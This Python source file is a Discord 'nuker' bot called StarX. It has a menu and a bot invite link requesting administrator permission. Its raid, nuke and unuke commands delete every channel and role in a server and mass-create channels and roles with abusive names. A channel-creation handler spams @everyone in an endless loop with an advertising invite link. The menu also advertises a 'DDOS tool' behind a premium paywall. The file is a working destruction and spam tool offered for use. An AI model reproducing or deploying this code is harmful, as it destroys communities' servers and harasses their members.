from email import message
from multiprocessing import Event
import random
import discord
import time
from discord.ext import commands
from asyncio import sleep
from datetime import date
import colorama
from colorama import Fore
import os
from colorama import Style
import sys
import socket
import threading
import pyperclip
colorama.init()

random_role = ("StarX", "StarX.Spamed", "StarX.raider", "starX", "StarX geño", "StarXed", "StarS on StarX", "Nuked Bitch")
client = discord.Client()
client = commands.Bot(command_prefix="!")
attack_num = 0


class person:
    name = ''
    def setName(self, name):
        self.name = name

person_obj = person()
person_obj.name = ""



class developer:
    name = ' '
    def setName(self, name):
        self.name = name

developer_obj = developer()
developer_obj.name = ""


def welcome():
    key = open("Key.txt", "r")
    CustomKey = key.read()
    if CustomKey == "98237173&2310378617087462366032":
            print(f''' {Fore.BLUE}   
██╗░░██╗░█████╗░██████╗░░█████╗░░█████╗░███╗░░░███╗
██║░██╔╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗████╗░████║{Fore.MAGENTA}
█████═╝░███████║██████╦╝██║░░██║██║░░██║██╔████╔██║
██╔═██╗░██╔══██║██╔══██╗██║░░██║██║░░██║██║╚██╔╝██║{Fore.RED}
██║░╚██╗██║░░██║██████╦╝╚█████╔╝╚█████╔╝██║░╚═╝░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░░╚════╝░░╚════╝░╚═╝░░░░░╚═╝
            ''')
            print(Style.RESET_ALL)
            print(Fore.CYAN + '')
            TermsHavenLoad = ["[■□□□□□□□□□ 10%]","[■■□□□□□□□□ 20%]", "[■■■□□□□□□□ 30%]", "[■■■■□□□□□□] 40%", "[■■■■■□□□□□] 50%", "[■■■■■■□□□□] 60%", "[■■■■■■■□□□] 70%", "[■■■■■■■■□□] 80%", "[■■■■■■■■■□] 90%", "[■■■■■■■■■■] 100%"]
            print(Style.RESET_ALL)
            print(Fore.MAGENTA + '')
            for i in range(10):
                time.sleep(0.15)
                sys.stdout.write("\rWait Few seconds..." + TermsHavenLoad[i % len(TermsHavenLoad)])
                sys.stdout.flush()
            print()
            time.sleep(0.5)
            print(Fore.LIGHTMAGENTA_EX + '╔═══════════════════════╦═══════════════════════╦════════════════════╗')
            print(Fore.MAGENTA + '║ 1 > Discord tool      ║   Functional          ║ (Annonymous)       ║ ')
            print(Fore.MAGENTA + '║ 2 > Discord bot invite║   Functional          ║ (Annonymous)       ║ ')
            print(Fore.BLUE + '║ 3 > DDOS tool         ║   Functional          ║ (Annonymous)       ║')
            print(Fore.BLUE + '║ 4 > Who is Annonymous?║   Functional          ║ (Annonymous)       ║')
            print(Fore.LIGHTBLUE_EX + '╚═══════════════════════╩═══════════════════════╩════════════════════╝')
            print("")
            print(Fore.LIGHTCYAN_EX + '')
            print(Fore.MAGENTA + 'StarX loaded moving to conrtol panel')
            choice = int(input(f'{Fore.CYAN}[Module]> '))

            traveling = ["T","r", "a", "v", "e", "l", "i","n", "g","." ,".", "."]

            for i in range(11):
                time.sleep(0.05)
                sys.stdout.write("" + traveling[i % len(traveling)])
                sys.stdout.flush()
            print()

            if choice == 3:
                print('Buy premium')
                time.sleep(3)
                return welcome()   
            elif choice == 4:
                print(f'''{Fore.RED}
    ╔═════════════════════════════════════════════════════════════╗
    ║  No one, just hacker                                        ║   
    ╚═════════════════════════════════════════════════════════════╝
                ''')
                time.sleep(5)
                return welcome()
            elif choice == 2:
                os.startfile('https://discord.com/api/oauth2/authorize?client_id=964098146227605534&permissions=8&scope=bot')
                print(f'''{Fore.GREEN}
    ╔═════════════════════════════════════════════════════════════╗
    ║  Link was copied into your clipboard                        ║ 
    ╚═════════════════════════════════════════════════════════════╝
                ''')
                time.sleep(3)
                return welcome()
            elif choice == 1:
                print(f'''{Fore.MAGENTA}
                ╔══════════════════╦═══════════════════════╦════════════════════╦════════════════════╗
                ║ 1 > Channel maker║ 2 > Nuker             ║ 3 > U-Nuke         ║  4 > Exit          ║ {Fore.BLUE}     
                ║  !raid           ║  !nuke                ║  !unuke            ║  Exit              ║
                ╚══════════════════╩═══════════════════════╩════════════════════╩════════════════════╝''')
                control = (input(f'{Fore.CYAN}[?]> '))
                #raider
                if control == "1":
                    channelname = input("Name of channel? ")
                    repeats = int(input("How many times? "))
                    channelmessage = input("Message to channel? ")
                    person_obj.setName(channelmessage)
                    @client.command()
                    async def raid(ctx):
                        await ctx.message.delete()
                        guild = ctx.guild
                        for i in range (0, repeats):
                            await guild.create_text_channel(channelname)
                        return welcome()
                #nuker
                if control == "2":
                    @client.command()
                    async def nuke(ctx):
                        await ctx.message.delete()
                        guild = ctx.guild
                        for channel in guild.channels:
                            try:
                                await channel.delete()
                                print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
                            except:
                                print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
                        return welcome()
                if control == "3":
                    repeats = 20
                    repeat = 1
                    @client.command()
                    async def unuke(ctx):
                        await ctx.message.delete()
                        guild = ctx.guild
                        for role in guild.roles:
                            try:
                                await role.delete()
                                print(Fore.MAGENTA + f"{role.name} was deleted." + Fore.RESET)
                            except:
                                print(Fore.GREEN + f"{role.name} was NOT deleted." + Fore.RESET)
                        for channel in guild.channels:
                            try:
                                await channel.delete()
                                print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
                                print(Fore.MAGENTA + f"Nuked channel was created" + Fore.RESET)
                            except:
                                print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
                        for i in range(0,repeats):
                            await guild.create_role(name= random.choice(random_role))
                            print(Fore.MAGENTA + f"{role.name} was created." + Fore.RESET)
                        await guild.create_text_channel('Nuked')
                        return welcome()
                if control == "4":
                    print(f'''{Fore.LIGHTYELLOW_EX}
    ╔═════════════════════════════════════════════════════════════╗
    ║  Redirecting into control panel                             ║
    ╚═════════════════════════════════════════════════════════════╝
                ''') 
                    for i in range(10):
                        time.sleep(0.05)
                        sys.stdout.write("\rWait Few seconds..." + TermsHavenLoad[i % len(TermsHavenLoad)])
                        sys.stdout.flush()
                    return welcome()
    else:
        print('You stoled item')

@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(f"@everyone StarX nuker: https://discord.gg/DWbcez9T6F (Owner: Annonymous) {person_obj.name}")
if __name__ == '__main__':
    welcome()
client.run('')